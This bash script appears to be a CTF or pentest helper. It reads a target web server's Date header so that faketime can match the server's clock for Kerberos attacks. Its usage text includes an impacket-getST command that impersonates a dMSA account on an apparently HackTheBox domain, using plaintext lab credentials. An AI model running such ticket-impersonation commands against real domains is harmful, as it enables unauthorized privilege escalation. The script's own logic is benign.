#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m'

success() { 
    echo -e "${GREEN}[✓]${NC} :: $1" 1>&2
}

info() { 
    echo -e "${BLUE}[i]${NC} :: $1" 1>&2
}

warning() { 
    echo -e "${YELLOW}[!]${NC} :: $1" 1>&2
}

error() { 
    echo -e "${RED}[✗]${NC} :: $1" 1>&2
}

section() { 
    echo -e "${CYAN}[ $1 ]${NC}" 1>&2
}

#== Faketime Date Fetcher
# Description: Fetches remote server dates for use with faketime to bypass time restrictions
# Features:
#   # Installs faketime automatically if missing
#   # Extracts date from HTTP headers in faketime-compatible format
#   # Silent mode by default, verbose only on errors
#   # For authorized penetration testing and CTF challenges only

# Function to print usage information
print_usage() {
    echo "Usage: $0 <target_host> [port]" 1>&2
    echo "" 1>&2
    echo "Examples:" 1>&2
    echo "  $0 10.10.11.95" 1>&2
    echo "  $0 10.10.11.95 8080" 1>&2
    echo "" 1>&2
    echo "With faketime:" 1>&2
    echo "  faketime \"\$($0 10.10.11.95)\" impacket-getST eighteen.htb/adam.scott:iloveyou1 -impersonate 'enc_dmsa\$' -self -dmsa -debug" 1>&2
}

# Check for help flag or no arguments
if [ $# -eq 0 ] || [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
    print_usage
    exit 0
fi

#== Core function definition
getDate() {
    date -d "$(wget --method=HEAD -qSO- --max-redirect=0 $@ 2>&1 | sed -n 's/^ *Date: *//p')" "+%Y-%m-%d %H:%M:%S" 2>/dev/null
}

#== Check and install faketime (silent)
check_faketime() {
    if ! command -v faketime &> /dev/null; then
        # Silent installation
        sudo apt update > /dev/null 2>&1 && sudo apt install -y faketime > /dev/null 2>&1
        
        if [ $? -ne 0 ]; then
            error "Failed to install faketime" 1>&2
            echo "Please install manually: sudo apt install faketime" 1>&2
            return 1
        fi
    fi
    return 0
}

#== Main execution
main() {
    # Parse arguments
    local target_host="$1"
    local target_port="${2:-80}"
    
    #== Validations
    if [ -z "$target_host" ]; then
        error "No target host specified" 1>&2
        print_usage
        exit 1
    fi
    
    # Validate port
    if ! [[ "$target_port" =~ ^[0-9]+$ ]] || [ "$target_port" -lt 1 ] || [ "$target_port" -gt 65535 ]; then
        error "Invalid port number" 1>&2
        exit 1
    fi
    
    # Check faketime silently
    if ! check_faketime; then
        exit 1
    fi
    
    # Get server date - try primary method first
    local server_date=$(getDate "$target_host:$target_port")
    
    # If primary method failed, try alternatives silently
    if [ -z "$server_date" ]; then
        # Try curl silently
        if command -v curl &> /dev/null; then
            server_date=$(curl -sI "http://$target_host:$target_port/" 2>/dev/null | grep -i "^Date:" | head -1 | sed 's/^Date: *//')
            [ -n "$server_date" ] && server_date=$(date -d "$server_date" "+%Y-%m-%d %H:%M:%S" 2>/dev/null)
        fi
        
        # If still empty, try netcat
        if [ -z "$server_date" ] && command -v nc &> /dev/null; then
            local response=$(echo -e "HEAD / HTTP/1.0\r\n\r\n" | timeout 3 nc -w 2 "$target_host" "$target_port" 2>/dev/null)
            server_date=$(echo "$response" | grep -i "^Date:" | head -1 | sed 's/^Date: *//')
            [ -n "$server_date" ] && server_date=$(date -d "$server_date" "+%Y-%m-%d %H:%M:%S" 2>/dev/null)
        fi
    fi
    
    # Output result or error
    if [ -n "$server_date" ]; then
        echo "$server_date"
        exit 0
    else
        error "Failed to get date from $target_host:$target_port" 1>&2
        exit 1
    fi
}

# Run main function with all arguments
main "$@"
